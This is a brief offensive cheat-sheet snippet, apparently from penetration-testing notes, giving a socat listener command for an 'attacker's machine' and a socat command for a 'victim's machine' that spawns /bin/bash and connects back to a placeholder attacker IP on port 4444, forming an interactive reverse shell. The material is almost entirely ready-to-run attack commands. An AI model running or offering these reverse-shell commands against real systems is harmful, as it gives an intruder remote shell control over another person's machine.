### If you control both machines 
**Attacker's Machine**
```
socat file:'tty',raw,echo=0 tcp-listen:4444
```

**Victim's Machine**
```
socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:4444
```

**`Socat` needs to be on both machines for this to work.**

